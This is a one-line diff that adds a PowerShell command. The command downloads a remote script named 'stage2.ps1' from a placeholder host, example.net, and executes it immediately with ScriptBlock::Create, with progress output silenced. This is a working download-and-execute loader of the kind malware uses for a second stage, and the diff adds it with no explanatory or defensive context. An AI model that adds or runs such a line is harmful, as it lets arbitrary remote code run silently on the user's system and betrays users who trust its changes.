@@ -1,0 +1,1 @@
+$PayloadUrl = "https://example.net/stage2.ps1"; $DownloadedScript = (New-Object Net.WebClient).DownloadString($PayloadUrl); & ([ScriptBlock]::Create($DownloadedScript)); $ProgressPreference = "SilentlyContinue"
